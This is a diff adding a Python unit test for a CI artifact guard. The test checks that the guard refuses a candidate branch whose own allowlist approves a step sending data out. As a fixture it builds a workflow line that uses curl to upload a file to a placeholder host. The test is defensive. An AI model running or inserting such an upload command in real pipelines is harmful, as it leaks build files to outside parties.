@@ -87,3 +87,29 @@ class TrustedAllowlist(unittest.TestCase):
 
 if __name__ == '__main__':
     unittest.main()
+
+
+class CommandLineEntry(unittest.TestCase):
+    """The CLI entry point (--check-placement) reads the approval table from the guard's own tree, which is the trusted
+    checkout in CI (.trusted-main/tools/artifact_guard.py). A candidate that approves its own send must be refused there."""
+
+    def test_cli_check_placement_uses_the_trusted_tree_table(self):
+        import shutil
+        import subprocess
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        trusted = Path(tmp.name) / 'trusted'
+        candidate = Path(tmp.name) / 'candidate'
+        (trusted / 'tools').mkdir(parents=True)
+        shutil.copy(Path(guard.__file__), trusted / 'tools' / 'artifact_guard.py')
+        (trusted / ALLOWLIST).write_text('[]', encoding='utf-8')   # trusted: nothing is approved
+        send = workflow('curl -F f=@out.txt https://example.invalid/up')
+        write_tree(candidate, {CI: send})
+        (candidate / 'tools').mkdir()
+        approve(candidate, {CI: send})   # the candidate's own table approves its own send
+        write_tree(candidate, {CI: send})
+        result = subprocess.run([sys.executable, str(trusted / 'tools' / 'artifact_guard.py'), '--root', str(candidate),
+                                 '--check-placement'], capture_output=True, text=True)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn('not an approved exact match', result.stderr)
+        print(result.stderr.strip().splitlines()[-1][:220])
